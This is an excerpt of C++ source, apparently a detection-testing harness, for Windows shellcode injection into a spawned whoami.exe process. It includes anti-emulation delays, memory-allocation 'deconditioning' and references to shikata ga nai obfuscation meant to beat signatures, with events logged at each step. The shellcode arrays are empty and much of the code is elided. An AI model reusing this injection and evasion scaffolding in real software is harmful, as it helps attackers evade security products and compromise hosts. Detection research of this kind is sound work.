...
LPCWSTR procToInject = L"C:\\Windows\\SysWOW64\\whoami.exe"; // 32bit
#else
...
int main(int argc, char** argv) {
    ...
    msg << "Slept for approximately " << elapsed << " ms";
    print_and_emit_event(msg.str(), ok); msg.str("");
#endif

    // TODO: does deconditioning depend on anti_emulation?
#if defined anti_emulation_calc
    msg << "Doing anti emulation calc operations for about 5 sec";
    print_and_emit_event(msg.str(), ok); msg.str("");
    auto start = std::chrono::high_resolution_clock::now();
    volatile bool dummy; // do no optimze "calc prime" loop away
    for (UINT64 n = 2; n <= 20'000'000; ++n) { bool pr = true; for (UINT64 i = 2; i * i <= n; ++i) { if (n % i == 0) { pr = false; break; } } dummy = pr; }
    auto end = std::chrono::high_resolution_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
    ...
    print_and_emit_event(msg.str(), aft); msg.str("");
    Sleep(sleep_between_steps_ms);
    ...
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pi.dwProcessId);
    if (!hProcess) {
    ...
    // antiemulation and deconditioning depend on obfuscation (anti signature)
#if defined obfuscation || defined antiemulation_sleep || defined antiemulation_calc || defined deconditioning_alloc || defined deconditioning_calc
    ...
    // shikata ga nai - 32bit
    BYTE shellcode[] = {  }; 
#else
    ...
    msg << "Before reading local memory";
    print_and_emit_event(msg.str(), bef); msg.str("");

    // read local shellcode
    char buffer[sizeof(shellcode)] = { 0 };
    BOOL status = ReadProcessMemory(GetCurrentProcess(), shellcode, &buffer, sizeof(shellcode), 0);
    if (status) {
        msg << "After reading local memory, at: " << &shellcode;
        print_and_emit_event(msg.str(), aft); msg.str("");
        Sleep(sleep_between_steps_ms);
    }
    else {
        msg << "Failed read local memory: " << GetLastError();
        print_and_emit_event(msg.str(), fail); msg.str("");
        return 1;
    }
    ...
    BYTE nonsense[] = {  };
    ...
    for (int n = 0; n < repetitions; n++) {
        ...
        for (int i = 0; i < sizeof(allocs) / sizeof(allocs[0]); i++) {
            ...
            allocs[i] = alloc_addr;
            for (int c = 0; c < sizeof(nonsense) / sizeof(nonsense[0]); c++) {
                nonsense[c] = nonsense[c] ^ i ^ n;
            }
